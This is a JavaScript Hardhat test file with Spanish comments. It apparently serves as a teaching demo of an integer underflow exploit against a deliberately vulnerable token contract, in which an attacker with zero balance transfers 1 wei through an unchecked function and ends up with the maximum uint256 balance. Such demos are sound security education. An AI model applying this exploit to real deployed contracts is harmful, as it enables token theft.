import assert from "assert";
import pkg from "hardhat";
const { ethers } = pkg;

describe("Ataque de Integer Overflow/Underflow (TokenVulnerable)", function () {
  let token;
  let owner;
  let atacante;
  let receptor;

  beforeEach(async function () {
    [owner, atacante, receptor] = await ethers.getSigners();
    // Inicializar TokenVulnerable con 100 tokens (100 * 10^18 wei) de supply
    const TokenFactory = await ethers.getContractFactory("TokenVulnerable");
    token = await TokenFactory.deploy(ethers.parseEther("100.0"));
  });

  it("Debería causar un underflow en transferirUnchecked y dar al atacante saldo máximo", async function () {
    const saldoInicialAtacante = await token.balances(atacante.address);
    console.log(`\n========================================`);
    console.log(`Saldo inicial del atacante: ${saldoInicialAtacante.toString()} tokens`);

    console.log(`\n--- Ejecutando transferencia unchecked de 1 wei desde cuenta con saldo 0 ---`);
    await token.connect(atacante).transferirUnchecked(receptor.address, 1);

    const saldoFinalAtacante = await token.balances(atacante.address);
    const saldoFinalReceptor = await token.balances(receptor.address);

    console.log(`\n================ RESULTADOS ================`);
    console.log(`Saldo final del receptor: ${saldoFinalReceptor.toString()} wei`);
    console.log(`Saldo final del atacante (por underflow): ${saldoFinalAtacante.toString()} tokens`);
    console.log(`========================================\n`);

    const MaxUint256 = ethers.MaxUint256;
    assert.strictEqual(saldoFinalAtacante.toString(), MaxUint256.toString());
  });
});
